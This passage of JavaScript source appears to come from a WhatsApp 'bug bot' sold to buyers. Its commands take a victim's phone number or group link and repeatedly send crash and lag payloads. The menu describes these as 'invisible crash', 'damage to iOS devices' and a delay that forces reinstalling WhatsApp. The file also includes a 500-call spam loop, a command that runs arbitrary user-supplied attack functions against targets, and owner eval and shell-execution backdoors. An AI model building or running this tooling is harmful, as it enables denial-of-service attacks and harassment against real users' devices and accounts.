                let caption = `╰──•  𝖣𝖾𝗌𝖼𝗋𝗂𝗉𝗍𝗂𝗈𝗇   : 𝖳𝗁𝗂𝗌 𝖻𝗈𝗍 𝗂𝗌 𝖽𝖾𝗌𝗂𝗀𝗇𝖾𝖽 𝗍𝗈 𝗆𝖺𝗇𝖺𝗀𝖾 𝖼𝗈𝗆𝗆𝖺𝗇𝖽𝗌 𝖾𝖿𝖿𝗂𝖼𝗂𝖾𝗇𝗍𝗅𝗒, 𝗉𝗋𝗈𝗏𝗂𝖽𝖾 𝗂𝗇𝗍𝖾𝗋𝖺𝖼𝗍𝗂𝗏𝖾 𝗆𝖾𝗇𝗎𝗌, 𝗋𝖾𝗊𝗎𝖾𝗌𝗍 𝗉𝖺𝗒𝗆𝖾𝗇𝗍𝗌, 𝖺𝗇𝖽 𝗁𝖺𝗇𝖽𝗅𝖾 𝗆𝗎𝗅𝗍𝗂𝗉𝗅𝖾 𝗎𝗌𝖾𝗋 𝗂𝗇𝗍𝖾𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 𝗌𝖾𝖺𝗆𝗅𝖾𝗌𝗌𝗅𝗒. 
  𝖨𝗍 𝗐𝗈𝗎𝗅𝖽 **𝗇𝖾𝗏𝖾𝗋 𝖾𝗑𝗂𝗌𝗍 𝗐𝗂𝗍𝗁𝗈𝗎𝗍 𝗍𝗁𝖾 𝖽𝖾𝖽𝗂𝖼𝖺𝗍𝗂𝗈𝗇, 𝗌𝗎𝗉𝗉𝗈𝗋𝗍, 𝖺𝗇𝖽 𝖾𝖿𝖿𝗈𝗋𝗍 𝗈𝖿 𝗍𝗁𝖾 𝖺𝗆𝖺𝗓𝗂𝗇𝗀 𝗍𝖾𝖺𝗆 𝖻𝖾𝗁𝗂𝗇𝖽 𝗂𝗍.** 
  
* 𝖿𝖾𝖺𝗍𝗎𝗋𝖾𝗌      :*
    • 𝖨𝗇𝗍𝖾𝗋𝖺𝖼𝗍𝗂𝗏𝖾 𝖲𝗂𝗇𝗀𝗅𝖾 𝖲𝖾𝗅𝖾𝖼𝗍 𝖬𝖾𝗇𝗎
    • 𝖭𝖺𝗍𝗂𝗏𝖾 𝖥𝗅𝗈𝗐 𝖬𝖾𝗌𝗌𝖺𝗀𝖾 𝖲𝗎𝗉𝗉𝗈𝗋𝗍
    • 𝖠𝗎𝗍𝗈𝗆𝖺𝗍𝗂𝖼 𝖯𝖺𝗒𝗆𝖾𝗇𝗍 & 𝖯𝗈𝗈𝗅 𝖧𝖺𝗇𝖽𝗅𝗂𝗇𝗀
    • 𝖯𝗋𝗈𝗆𝗈 & 𝖡𝖺𝗇𝗇𝖾𝗋 𝖨𝗇𝗍𝖾𝗀𝗋𝖺𝗍𝗂𝗈𝗇
    • 𝖢𝗈𝗈𝗅𝖽𝗈𝗐𝗇 𝖬𝖺𝗇𝖺𝗀𝖾𝗆𝖾𝗇𝗍 & 𝖠𝖼𝖼𝖾𝗌𝗌 𝖢𝗈𝗇𝗍𝗋𝗈𝗅

*𝗌𝗉𝖾𝖼𝗂𝖺𝗅 𝗍𝗁𝖺𝗇𝗄𝗌 𝗍𝗈𝗈*
𝖳𝗁𝗂𝗌 𝖻𝗈𝗍 𝗂𝗌 𝗆𝖺𝖽𝖾 𝗉𝗈𝗌𝗌𝗂𝖻𝗅𝖾 𝗍𝗁𝖺𝗇𝗄𝗌 𝗍𝗈 𝗍𝗁𝖾 𝖼𝗈𝗇𝗍𝗋𝗂𝖻𝗎𝗍𝗂𝗈𝗇𝗌 𝗈𝖿 𝗈𝗎𝗋 𝗂𝗇𝖼𝗋𝖾𝖽𝗂𝖻𝗅𝖾 𝗍𝖾𝖺𝗆 𝖺𝗇𝖽 𝗌𝗎𝗉𝗉𝗈𝗋𝗍𝖾𝗋𝗌:
- dexoffc
- 𝗋𝖾𝗇𝗇
- 𝖺𝗅𝗅 𝖻𝗎𝗒𝖾𝗋
 `;
                await sock.sendMessage(
                    m.chat,
                    {
                        productMessage: {
                            title: "𖣂᳟⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ⃜͜᭨᪳",
                            description: "Ты нвишься",
                            thumbnail: thumbX2,
                            productId: "PROD001",
                            retailerId: "RETAIL001",
                            url: "https://superior.com/donemsg",
                            body: caption,
                            footer: `© since 2##1`,
                            priceAmount1000: 777777,
                            currencyCode: "USD",
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: " X ",
                                        id: `menu`
                                    })
                                }
                            ]
                        }
                    },
                    { quoted: secondary }
                );
                break;
            }
            
            case "allmenu":
            case "xall": {
                // Original allmenu code remains unchanged
                let caption = `┌──────
├─── *Core Menu*
┠─ ▢ Bot menu
├
├─ 𝗆𝖾𝗇𝗎
├─ 𝖺𝗅𝗅𝗆𝖾𝗇𝗎
├─ 𝗍𝖾𝗌𝗍𝖿𝗎𝗇𝖼
├─ 𝗌𝗍𝖺𝗍𝗎𝗌
├─ 𝗂𝗇𝖿𝗈𝖻𝗈𝗍
└

┌──────
├─── *Bvg Menu*
┠─ ▢ Bvg Tools 
├
├─ 𝖻𝗏𝗀
├─ crash
├─ vxdelay
├─ 𝗂𝗈𝗌
├─ xgc
└

┌──────
├─── *Owner Menu*
┠─ ▢ Bvg Tools 
├
├─ >
├─ $
├─ =>
├─ 𝖺𝖽𝖽𝖺𝖼𝖼𝖾𝗌
├─ 𝖽𝖾𝗅𝖺𝖼𝖼𝖾𝗌
├─ 𝗅𝗂𝗌𝗍𝖺𝖼𝖼𝖾𝗌
├─ 𝖺𝖽𝖽𝗈𝗐𝗇
├─ 𝗅𝗂𝗌𝗍𝗈𝗐𝗇
├─ 𝗉𝗎𝖻𝗅𝗂𝖼
├─ 𝗌𝖾𝗅𝖿
└
`;
                await sock.sendMessage(
                    m.chat,
                    {
                        productMessage: {
                            title: "𖣂᳟⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ⃜͜᭨᪳",
                            description: "Ты нвишься",
                            thumbnail: thumbX2,
                            productId: "PROD001",
                            retailerId: "RETAIL001",
                            url: "https://superior.com/donemsg",
                            body: caption,
                            footer: `© since 2##1`,
                            priceAmount1000: 777777,
                            currencyCode: "USD",
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: " X ",
                                        id: `menu`
                                    })
                                }
                            ]
                        }
                    },
                    { quoted: secondary }
                );
                break;
            }
            //
case 'bvg': {
    // Original bvg code remains unchanged
    if (!accesOnly) return m.reply('[ # ] You dont have access');            
    if (!args[0]) return m.reply('[ $ ] Usage: .bvg 62xxxxxxxx');

    const number = args[0].replace(/[^0-9]/g, '');
    const target = `${number}@s.whatsapp.net`;

    bvgSession.set(m.chat, target);

    await sock.sendMessage(
        m.chat,
        {
            interactiveMessage: {
                title: null,
                footer: "© since 2##1",
                image: thumbX,
                nativeFlowMessage: {
                    messageParamsJson: JSON.stringify({
                        system_meta: {
                            label: "internal_service",
                            version: "11.1.0",
                            checksum: "x9a71c2ff",
                            session_state: "stable"
                        }
                    }),
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                icon: "PROMOTION",
                                title: "sellection bugs",
                                sections: [
                                    {
                                        title: "𖣂᳟⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ⃜͜᭨᪳",
                                        highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                        rows: [
                                            { 
                                                title: "📃 LinkData – New invisible", 
                                                description: "Exploitation of previous bugs ( Payment )", 
                                                id: "crashnew" 
                                            }
                                        ]
                                    },
                                    {
                                        highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                        rows: [
                                            { 
                                                title: "📞 Call – Crash Invisible", 
                                                description: "Invisible crash with spam calls", 
                                                id: "call" 
                                            }
                                        ]
                                    },                                
                                    {
                                        highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                        rows: [
                                            { 
                                                title: "⏳ Secret Message –", 
                                                description: "Extreme delay effect to reinstall WhatsApp", 
                                                id: "delay" 
                                            }
                                        ]
                                    },
                                    {
                                        highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                        rows: [
                                            { 
                                                title: "🏆 Extended – Crash IOS Invisible", 
                                                description: "Damage to iOS devices, invisible crash.", 
                                                id: "appale" 
                                            }
                                        ]
                                    }
                                ],
                                has_multiple_buttons: true
                            })
                        }
                    ]
                }
            }
        },
        { quoted: secondary }
    );

    break;
}

/* Session bvg sellection */
            case 'crashnew': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');
                const target = bvgSession.get(m.chat);
                if (!target) return m.reply('[ $ ] Session expired, send .bvg again');
                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });

                for (let i = 0; i < 2; i++) {
                    await travas.crashspam(sock, target);
                    await sleep(1000);
                }
                break;
            }
            
            case 'call': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');
                const target = bvgSession.get(m.chat);
                if (!target) return m.reply('[ $ ] Session expired, send .bvg again');
                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });

                for (let i = 0; i < 500; i++) {
                    await sleep(1000);
                    await travas.call(sock, target);
                    await sleep(1000);
                }
                break;
            }

            case 'delay': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');
                const target = bvgSession.get(m.chat);
                if (!target) return m.reply('[ $ ] Session expired, send .bvg again');
                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });
                for (let i = 0; i < 2; i++) {
                     await sleep(1000);
                    await travas.delay2(sock, target);
                    await sleep(1000);
                }
                break;
            }

            case 'appale': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');
                const target = bvgSession.get(m.chat);
                if (!target) return m.reply('[ $ ] Session expired, send .bvg again');
                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });
                for (let i = 0; i < 50; i++) {
                    await travas.ios(sock, target);
                    await sleep(1000);
                }
                break;
            }
            
/* manual Comand bugs */
            case 'crash': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');

                if (!q) return m.reply(`⁉️ Missing target number.\n\nExample:\n${prefix}X 628123456789`);

                const number = q.replace(/[^0-9]/g, '');

                const target = `${number}@s.whatsapp.net`;

                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });
                for (let i = 0; i < 1; i++) {
                    try {
                        travas.crashspam(sock, target);
                    } catch (err) {
                        console.log(chalk.blue(`[ ! ] Execution failed (loop ${i + 1})`), err);
                    }
                }
                break;
            }
            
                        case 'ios': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');

                if (!q) return m.reply(`⁉️ Missing target number.\n\nExample:\n${prefix}X 628123456789`);

                const number = q.replace(/[^0-9]/g, '');

                const target = `${number}@s.whatsapp.net`;

                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });
                for (let i = 0; i < 1; i++) {
                    try {
                        travas.delay2(sock, target);
                    } catch (err) {
                        console.log(chalk.blue(`[ ! ] Execution failed (loop ${i + 1})`), err);
                    }
                }
                     for (let i = 0; i < 50; i++) {
                    await travas.ios(sock, target);
                    await sleep(1000);
                }
                break;
            }
            
            case 'vxdelay': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');

                if (!q) return m.reply(`⁉️ Missing target number.\n\nExample:\n${prefix}X 628123456789`);

                const number = q.replace(/[^0-9]/g, '');

                const target = `${number}@s.whatsapp.net`;

                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });
                for (let i = 0; i < 1; i++) {
                    try {
                        travas.delay2(sock, target);
                    } catch (err) {
                        console.log(chalk.blue(`[ ! ] Execution failed (loop ${i + 1})`), err);
                    }
                }
                break;
            }

            case 'xgc': {
                if (!accesOnly) return m.reply('[ # ] You dont have access');

                if (!q) return m.reply(`⁉️ Falta enlace de invitación al grupo.\n\nEjemplo:\n${prefix}grup https://chat.whatsapp.com/AbCdEfGhIjKlMnOpQr`);

                const codeinvite = (q.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/i) || [])[1];
                if (!codeinvite) return m.reply('[ $ ] Enlace de invitación de grupo inválido');

                let target;
                try {
                const res = await sock.groupGetInviteInfo(codeinvite);
                target = res.id; 
                } catch (err) {
                return m.reply('[ ! ] Falló al obtener información del grupo');
                }

                await sendDoneBug({
                    sock,
                    chat: m.chat,
                    quoted: secondary,
                    X: target.split('@')[0]
                });
                for (let i = 0; i < 1; i++) {
                    try {
                        await travas.mixgrup(sock, target);
                        await sleep(1000);
                    } catch (err) {
                        console.log(chalk.blue(`[ ! ] Ejecución fallida (bucle ${i + 1})`), err);
                    }
                }
                break;
            }                        


            case 'testfunc': {
                if (!TheBot) return m.reply('[ #!. ] Only for owners');

                if (!m.quoted) return m.reply(`[ $ ] Please reply to a message containing a *JavaScript function*\n\nExample:\nreply -> async function test(sock, target, ctx){...}\n${prefix}tesfunc 628xxxx,1`);

                if (!q) return m.reply(`⁉️ Missing format.\n\nExample:\n${prefix}tesfunc 628xxxx,5`);

                let [rawTarget, rawLoop] = q.split(',');
                const number = (rawTarget || '').replace(/[^0-9]/g, '');

                if (!number) return m.reply('[ $ ] Invalid target number');

                const loop = Number(rawLoop) || 1;
                const target = `${number}@s.whatsapp.net`;

                const funcCode = m.quoted.text || m.quoted.caption || '';
                if (!funcCode.includes('function')) return m.reply('[ $ ] Replied message is not a function');

                let fn;
                try {
                    fn = new Function('sock', 'target', 'ctx', funcCode);
                } catch (e) {
                    return m.reply(`[ $ ] Parse error:\n${e.message}`);
                }

                const ctx = {
                    proto: require('baileys').proto,
                    generateWAMessageFromContent: require('baileys').generateWAMessageFromContent,
                    relay: async (jid, msg) => {
                        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
                    }
                };

                await m.reply(`[ # ] *TESFUNC EXECUTION*\n\n$ Target : ${number}\n$ Loop   : ${loop}x`);

                for (let i = 0; i < loop; i++) {
                    try {
                        await fn(sock, target, ctx);
                    } catch (e) {
                        console.log('[TESFUNC ERROR]', e);
                    }
                }

                m.reply('[ ! ] Done');
                break;
            }

            case 'addowner':
            case 'addown': {
                if (!TheBot) return m.reply('[ #!. ] Only for owners');

                if (!q) return m.reply(`⁉️ Missing number.\n\nExample:\n${prefix + cmd} 628123456789`);

                const number = q.replace(/[^0-9]/g, '');
                const check = await sock.onWhatsApp(number + '@s.whatsapp.net');

                if (!check?.length) return m.reply('[ $ ] Number is not registered on WhatsApp');

                Owner.push(number);
                acces.push(number);

                fs.writeFileSync('./database/own.json', JSON.stringify(Owner));
                fs.writeFileSync('./database/prem.json', JSON.stringify(acces));

                m.reply(`[ # ] Owner added successfully\n\n$ Number: ${number}`);
                break;
            }

            case 'delowner':
            case 'delown': {
                if (!TheBot) return m.reply('[ #!. ] Only for owners');

                if (!q) return m.reply(`⁉️ Missing number.\n\nExample:\n${prefix + cmd} 628123456789`);

                const number = q.replace(/[^0-9]/g, '');
                const oIdx = Owner.indexOf(number);
                const pIdx = acces.indexOf(number);

                if (oIdx === -1 && pIdx === -1) return m.reply('[ $ ] Number not found in Owner or acces list');

                if (oIdx !== -1) Owner.splice(oIdx, 1);
                if (pIdx !== -1) acces.splice(pIdx, 1);

                fs.writeFileSync('./database/own.json', JSON.stringify(Owner));
                fs.writeFileSync('./database/prem.json', JSON.stringify(acces));

                m.reply(`[ # ] Owner removed successfully\n\n$ Number: ${number}`);
                break;
            }

            case 'addakses':
            case 'addacces': {
                if (!TheBot) return m.reply('[ #!. ] Only for owners');

                if (!q) return m.reply(`⁉️ Missing number.\n\nExample:\n${prefix + cmd} 628123456789`);

                const number = q.replace(/[^0-9]/g, '');
                const check = await sock.onWhatsApp(number + '@s.whatsapp.net');

                if (!check?.length) return m.reply('[ $ ] Number is not registered on WhatsApp');

                acces.push(number);
                fs.writeFileSync('./database/prem.json', JSON.stringify(acces));

                m.reply(`[ # ] acces user added\n\n$ Number: ${number}`);
                break;
            }

            case 'delakses':
            case 'delacces': {
                if (!TheBot) return m.reply('[ #!. ] Only for owners');

                if (!q) return m.reply(`⁉️ Missing number.\n\nExample:\n${prefix + cmd} 628xxxx`);

                const number = q.replace(/[^0-9]/g, '');
                const idx = acces.indexOf(number);

                if (idx === -1) return m.reply('[ $ ] Number is not a acces user');

                acces.splice(idx, 1);
                fs.writeFileSync('./database/prem.json', JSON.stringify(acces));

                m.reply(`[ # ]  acces user removed\n\n$ Number: ${number}`);
                break;
            }

            case 'public': {
                if (!TheBot) return m.reply('[ #!. ] Only for owners');

                sock.public = true;
                m.reply('[ # ]  Bot is now in *Public Mode*');
                break;
            }

            case 'self':
            case 'private': {
                if (!TheBot) return m.reply('[ #!. ] Only for owners');

                sock.public = false;
                m.reply('[ # ]  Bot is now in *Self (Private) Mode*');
                break;
            }

            default:
                // Original eval commands remain unchanged
                if (budy.startsWith('=>')) {
                    if (!TheBot) return;

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2);
                        bang = util.format(sat);
                        if (sat == undefined) {
                            bang = util.format(sul);
                        }
                        return m.reply(bang);
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
                    } catch (e) {
                        m.reply(String(e));
                    }
                }

                if (budy.startsWith('>')) {
                    if (!TheBot) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        await m.reply(String(err));
                    }
                }

                if (budy.startsWith('$')) {
                    if (!TheBot) return;
                    require("child_process").exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`);
                        if (stdout) return m.reply(stdout);
                    });
                }
        }
    } catch (err) {
        sock.sendMessage(m.chat, {
            text: require('util').format(err)
        }, { quoted: m });
        console.log('\x1b[1;31m' + err + '\x1b[0m');
    }
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});